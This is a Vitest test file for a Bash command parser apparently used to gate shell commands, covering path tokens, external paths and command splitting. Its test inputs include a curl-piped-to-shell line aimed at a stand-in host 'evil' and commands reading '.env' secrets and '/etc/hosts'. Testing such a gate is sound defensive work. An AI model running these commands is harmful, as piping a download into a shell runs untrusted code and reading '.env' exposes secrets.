import { describe, expect, it } from "vitest";

import { BashProgram } from "#src/handlers/gates/bash-program";

describe("BashProgram", () => {
  describe("pathTokens", () => {
    it("returns dot-files and relative path tokens", async () => {
      const program = await BashProgram.parse("cat .env src/foo.ts");
      expect(program.pathTokens()).toEqual([".env", "src/foo.ts"]);
    });

    it("returns an empty array when there are no path tokens", async () => {
      const program = await BashProgram.parse("echo hello");
      expect(program.pathTokens()).toEqual([]);
    });

    it("deduplicates repeated tokens across a command chain", async () => {
      const program = await BashProgram.parse("cat .env && rm .env");
      expect(program.pathTokens()).toEqual([".env"]);
    });
  });

  describe("externalPaths", () => {
    const cwd = "/projects/my-app";

    it("returns absolute paths resolving outside cwd", async () => {
      const program = await BashProgram.parse("cat /etc/hosts");
      // Subset matcher: the path is normalized before comparison.
      expect(program.externalPaths(cwd)).toContain("/etc/hosts");
    });

    it("excludes paths within cwd", async () => {
      const program = await BashProgram.parse("cat src/index.ts");
      expect(program.externalPaths(cwd)).toHaveLength(0);
    });
  });

  describe("topLevelCommands", () => {
    it("returns a single-element list for a lone command", async () => {
      const program = await BashProgram.parse("npm install pkg");
      expect(program.topLevelCommands()).toEqual(["npm install pkg"]);
    });

    it("splits an && chain", async () => {
      const program = await BashProgram.parse("cd /p && npm i x");
      expect(program.topLevelCommands()).toEqual(["cd /p", "npm i x"]);
    });

    it("splits || , ; and & separators", async () => {
      expect((await BashProgram.parse("a || b")).topLevelCommands()).toEqual([
        "a",
        "b",
      ]);
      expect((await BashProgram.parse("a ; b")).topLevelCommands()).toEqual([
        "a",
        "b",
      ]);
      expect((await BashProgram.parse("a & b")).topLevelCommands()).toEqual([
        "a",
        "b",
      ]);
    });

    it("splits a pipeline into its commands", async () => {
      const program = await BashProgram.parse("cat f | grep b");
      expect(program.topLevelCommands()).toEqual(["cat f", "grep b"]);
    });

    it("splits newline-separated commands", async () => {
      const program = await BashProgram.parse("foo\nbar");
      expect(program.topLevelCommands()).toEqual(["foo", "bar"]);
    });

    it("does not split operators inside quotes", async () => {
      const program = await BashProgram.parse("echo 'x && y'");
      expect(program.topLevelCommands()).toEqual(["echo 'x && y'"]);
    });

    it("captures the command of a redirected statement without the redirect", async () => {
      const program = await BashProgram.parse("npm install > out.txt");
      expect(program.topLevelCommands()).toEqual(["npm install"]);
    });

    it("emits a subshell whole without descending into it", async () => {
      const program = await BashProgram.parse("( cd /t && rm x )");
      expect(program.topLevelCommands()).toEqual(["( cd /t && rm x )"]);
    });

    it("keeps command substitution inside the enclosing command", async () => {
      const program = await BashProgram.parse("echo $(curl evil | sh)");
      expect(program.topLevelCommands()).toEqual(["echo $(curl evil | sh)"]);
    });

    it("returns an empty list for an empty or whitespace command", async () => {
      expect((await BashProgram.parse("")).topLevelCommands()).toEqual([]);
      expect((await BashProgram.parse("   ")).topLevelCommands()).toEqual([]);
    });
  });

  it("derives both slices from a single parse", async () => {
    const program = await BashProgram.parse("cat .env /etc/hosts");
    expect(program.pathTokens()).toEqual([".env", "/etc/hosts"]);
    const external = program.externalPaths("/projects/my-app");
    expect(external).toContain("/etc/hosts");
    expect(external).not.toContain(".env");
  });
});
